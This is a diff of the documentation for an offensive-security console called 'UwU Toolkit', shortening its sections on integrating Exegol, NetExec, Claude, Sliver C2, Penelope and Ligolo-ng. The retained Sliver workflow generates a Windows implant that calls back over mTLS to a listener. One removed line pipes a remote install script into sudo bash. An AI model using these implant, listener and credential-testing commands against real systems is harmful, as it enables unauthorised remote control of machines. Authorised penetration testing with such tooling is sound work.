@@ -27,78 +27,16 @@ UwU Toolkit integrates with external tools and services to enhance your penetrat
 
 ## Exegol Integration
 
-[Exegol](https://github.com/ThePorgs/Exegol) is a community-driven hacking environment with pre-installed tools. UwU Toolkit seamlessly runs commands inside Exegol containers.
+[Exegol](https://github.com/ThePorgs/Exegol) is the recommended environment for UwU Toolkit. Modules automatically detect and use tools inside your Exegol container.
 
 ### Setup
 
 ```bash
-# Install Exegol
-pip install exegol
-
-# Start a container
-exegol start htb full
-
-# Set container in UwU Toolkit
+# Set your Exegol container
 uwu > setg EXEGOL_CONTAINER exegol-htb
 ```
 
-### How It Works
-
-When a module needs tools not installed locally:
-
-1. **Tool Detection** - Module calls `find_tool("GetUserSPNs.py")`
-2. **Local Check** - Searches extended PATH (`~/.local/bin`, `/opt/tools`, `/usr/bin`, etc.)
-3. **Exegol Fallback** - If not found, uses `run_in_exegol()` to execute in container
-4. **Output Return** - Results are captured and returned to UwU Toolkit
-
-### Kali Compatibility
-
-The same codebase works on Kali without code changes:
-- `find_tool()` checks `~/.local/bin` and `/usr/bin` (where Kali puts pip-installed tools)
-- Wordlist resolution checks `/usr/share/seclists` (Kali's default)
-- `WORKING_DIR` auto-detects `~/htb` or `~/ctf` if they exist
-
-### Module Example
-
-```python
-def run(self) -> bool:
-    # Try local first
-    tool_path = find_tool("impacket-GetUserSPNs")
-
-    if tool_path:
-        self.print_status("Using local tools")
-        ret, stdout, stderr = self.run_command([tool_path, ...])
-    else:
-        self.print_status("Using Exegol")
-        ret, stdout, stderr = self.run_in_exegol("GetUserSPNs.py ...")
-
-    return ret == 0
-```
-
-### Container Auto-Detection
-
-If `EXEGOL_CONTAINER` is not set:
-
-1. Searches for running containers starting with `exegol-`
-2. Uses the first match found
-3. Prompts if multiple containers are running
-
-### Running Commands in Exegol
-
-```python
-# Simple command
-ret, stdout, stderr = self.run_in_exegol(
-    "GetUserSPNs.py 'domain/user:pass' -dc-ip 10.10.10.100",
-    timeout=120
-)
-
-# Specify container explicitly
-ret, stdout, stderr = self.run_in_exegol(
-    "NetExec smb target -u user -p pass",
-    container="exegol-htb",
-    timeout=60
-)
-```
+If `EXEGOL_CONTAINER` is not set, UwU auto-detects running containers starting with `exegol-`.
 
 ---
 
@@ -395,38 +333,17 @@ uwu netexec > set ACTION check
 uwu netexec > run
 ```
 
-### Console Shortcut
-
-The `nxc` command also works directly for quick one-off checks:
-
-```bash
-uwu > nxc smb 10.10.10.100 -u admin -p Password123 --shares
-uwu > nxc ldap 10.10.10.100 -u admin -p Password123 -M laps
-```
-
 ---
 
 ## Claude AI Integration
 
 UwU Toolkit includes an AI-powered assistant using Claude for security research, code analysis, and interactive help.
 
-### Requirements
+### Setup
 
 ```bash
-# Install Anthropic SDK
-pip install anthropic
-
-# Set API key in UwU Toolkit
 uwu > setg ANTHROPIC_API_KEY sk-ant-api03-your-key-here
 ```
-
-### Getting an API Key
-
-1. Visit [console.anthropic.com](https://console.anthropic.com)
-2. Create an account or sign in
-3. Navigate to API Keys
-4. Create a new API key
-5. Copy the key (starts with `sk-ant-api03-`)
 
 ### Verify Setup
 
@@ -569,42 +486,7 @@ Claude: Great find! Here's your attack path:
 
 ## Sliver C2 Integration
 
-[Sliver](https://github.com/BishopFox/sliver) is an open-source cross-platform adversary emulation/C2 framework. UwU Toolkit provides integrated management.
-
-### Requirements
-
-```bash
-# Download Sliver
-curl https://sliver.sh/install | sudo bash
-
-# Or manually
-wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
-wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
-chmod +x sliver-*
-sudo mv sliver-server_linux /usr/local/bin/sliver-server
-sudo mv sliver-client_linux /usr/local/bin/sliver-client
-```
-
-### Generate Client Config
-
-On the Sliver server:
-
-```bash
-# Start server
-sliver-server
-
-# Generate operator config
-sliver > new-operator --name p3ta --lhost 10.10.14.50
-[*] Wrote operator config to: p3ta.cfg
-```
-
-Import on client:
-
-```bash
-sliver-client import ./p3ta.cfg
-```
-
-Configs are stored in `~/.sliver-client/configs/`.
+[Sliver](https://github.com/BishopFox/sliver) C2 is fully managed from within UwU Toolkit — server, client, implants, and sessions.
 
 ### Server Management
 
@@ -628,43 +510,6 @@ uwu > sliver connect
 
 # Connect with specific config
 uwu > sliver connect p3ta
-
-# Full Sliver client interface
-sliver > help
-sliver > implants
-sliver > use 1
-```
-
-### Client Interaction
-
-While in Sliver mode:
-
-- Full Sliver client functionality available
-- All Sliver commands work (`sessions`, `implants`, `generate`, etc.)
-- `Ctrl+D` - Background session (return to UwU)
-- `exit` - Exit and return to UwU
-
-### Resume Session
-
-```bash
-# After backgrounding with Ctrl+D
-uwu > sliver resume
-uwu > sliver fg   # Alias
-```
-
-### Status Check
-
-```bash
-uwu > sliver status
-
-  Sliver Status
-  ========================================
-
-  Server:  Running
-  Client:  Backgrounded (use 'sliver resume')
-  Configs: 2 available
-  Client:  /usr/local/bin/sliver-client
-  Server:  /usr/local/bin/sliver-server
 ```
 
 ### List Configs
@@ -681,59 +526,57 @@ uwu > sliver configs
       /home/p3ta/.sliver-client/configs/operator2.cfg
 ```
 
+### Status Check
+
+```bash
+uwu > sliver status
+
+  Sliver Status
+  ========================================
+
+  Server:  Running
+  Client:  Backgrounded (use 'sliver resume')
+  Configs: 2 available
+```
+
 ### Typical Workflow
 
 ```bash
-# 1. Start server
+# 1. Start server and connect
 uwu > sliver start
-
-# 2. Connect client
 uwu > sliver connect
 
-# 3. Generate implant
+# 2. Generate implant and start listener
 sliver > generate --mtls 10.10.14.50:443 --os windows --arch amd64 --save implant.exe
-
-# 4. Start listener
 sliver > mtls -l 443
 
-# 5. Wait for callback, then interact
+# 3. Interact with sessions
 sliver > sessions
 sliver > use 1
 
-# 6. Background to UwU (keep session)
+# 4. Background to UwU (keep session alive)
 # Press Ctrl+D
 
 uwu > # Continue with other tasks
 
-# 7. Resume when needed
+# 5. Resume when needed
 uwu > sliver resume
+uwu > sliver fg   # Alias
 ```
 
-### Integration Benefits
+### Inside Sliver Mode
 
-- **Session Persistence** - Background and resume without losing state
-- **Unified Interface** - Manage C2 alongside other tools
-- **Variable Sharing** - Use UwU global variables in Sliver commands
-- **Workflow Integration** - Switch between enumeration, exploitation, and C2
+Once connected, full Sliver client functionality is available:
+
+- All Sliver commands work (`sessions`, `implants`, `generate`, `use`, etc.)
+- `Ctrl+D` — Background session and return to UwU
+- `exit` — Exit and return to UwU
 
 ---
 
 ## Penelope Shell Handler
 
-[Penelope](https://github.com/brightio/penelope) is an advanced shell handler with auto-upgrade capabilities. UwU Toolkit provides full interactive integration with session management.
-
-### Requirements
-
-```bash
-# Clone Penelope
-git clone https://github.com/brightio/penelope.git /opt/penelope
-
-# Or install via pip (if available)
-pip install penelope-shell
-
-# Make executable
-chmod +x /opt/penelope/penelope.py
-```
+[Penelope](https://github.com/brightio/penelope) is an advanced shell handler with auto-upgrade capabilities, fully integrated into UwU Toolkit.
 
 ### Start Listener
 
@@ -831,23 +674,7 @@ penelope> spawn 9002     # New listener on 9002
 
 ## Ligolo-ng Tunneling
 
-[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) is a simple, lightweight tunneling tool using TUN interfaces. UwU Toolkit provides full proxy management with route configuration.
-
-### Requirements
-
-```bash
-# Download from releases
-wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_Linux_64bit.tar.gz
-wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_Linux_64bit.tar.gz
-
-# Extract
-tar -xzf ligolo-ng_proxy_Linux_64bit.tar.gz
-tar -xzf ligolo-ng_agent_Linux_64bit.tar.gz
-
-# Move to path
-sudo mv proxy /usr/local/bin/ligolo-proxy
-sudo mv agent /usr/local/bin/ligolo-agent
-```
+[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) tunneling is fully managed from UwU Toolkit — proxy, TUN interface, routes, and agents.
 
 ### Start Proxy
 
